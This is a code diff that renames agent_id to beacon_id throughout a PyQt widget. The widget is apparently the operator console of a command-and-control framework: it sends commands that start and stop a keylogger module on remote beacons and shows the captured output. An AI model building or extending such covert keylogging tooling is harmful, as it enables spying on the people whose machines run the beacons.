@@ -12,7 +12,7 @@ class KeyLoggerDisplay(QWidget):
     def __init__(self, beacon_repository: BeaconRepository):
         super().__init__()
         self.beacon_repository = beacon_repository
-        self.current_agent_id = None
+        self.current_beacon_id = None
         self.output_monitor = None
         
         # Pending monitor change to avoid blocking UI
@@ -60,36 +60,36 @@ class KeyLoggerDisplay(QWidget):
         self.setLayout(layout)
 
     def send_KeyLogger_start(self):
-        if not self.current_agent_id:
+        if not self.current_beacon_id:
             QMessageBox.warning(self, "Warning", "No agent selected!")
             return
         command = "execute_module|KeyLogger|start"
         try:
-            self.beacon_repository.update_beacon_command(self.current_agent_id, command)
+            self.beacon_repository.update_beacon_command(self.current_beacon_id, command)
         except Exception as e:
             if utils.logger:
                 utils.logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
             QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")
 
     def send_KeyLogger_stop(self):
-        if not self.current_agent_id:
+        if not self.current_beacon_id:
             QMessageBox.warning(self, "Warning", "No agent selected!")
             return
         command = "execute_module|KeyLogger|stop"
         try:
-            self.beacon_repository.update_beacon_command(self.current_agent_id, command)
+            self.beacon_repository.update_beacon_command(self.current_beacon_id, command)
         except Exception as e:
             if utils.logger:
                 utils.logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
             QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")
 
-    def set_agent(self, agent_id: str):
-        if agent_id == self.current_agent_id:
+    def set_agent(self, beacon_id: str):
+        if beacon_id == self.current_beacon_id:
             return
         
         # Don't block UI thread - defer monitor changes
-        self._pending_agent_change = agent_id
-        self.current_agent_id = agent_id
+        self._pending_agent_change = beacon_id
+        self.current_beacon_id = beacon_id
         
         # Clear display immediately for responsiveness
         self.output_display.clear()
@@ -99,8 +99,8 @@ class KeyLoggerDisplay(QWidget):
     
     def _apply_pending_monitor_change(self):
         """Apply pending monitor change without blocking UI thread"""
-        agent_id = self._pending_agent_change
-        if agent_id is None:
+        beacon_id = self._pending_agent_change
+        if beacon_id is None:
             return
             
         # Stop existing monitor (this can be slow)
@@ -109,7 +109,7 @@ class KeyLoggerDisplay(QWidget):
             # Use timer to wait for monitor stop without blocking
             QTimer.singleShot(100, lambda: self._wait_for_monitor_stop())
         else:
-            self._start_new_monitor(agent_id)
+            self._start_new_monitor(beacon_id)
     
     def _wait_for_monitor_stop(self):
         """Wait for monitor to stop and start new one"""
@@ -117,11 +117,11 @@ class KeyLoggerDisplay(QWidget):
             self.output_monitor.wait()  # This is the blocking operation
         self._start_new_monitor(self._pending_agent_change)
     
-    def _start_new_monitor(self, agent_id: str):
+    def _start_new_monitor(self, beacon_id: str):
         """Start new monitor for agent"""
         from config import ServerConfig
         config = ServerConfig()
-        self.output_monitor = KeyLoggerOutputMonitor(agent_id, self.beacon_repository, config)
+        self.output_monitor = KeyLoggerOutputMonitor(beacon_id, self.beacon_repository, config)
         self.output_monitor.output_received.connect(self.update_output)
         self.output_monitor.start()
         self._pending_agent_change = None
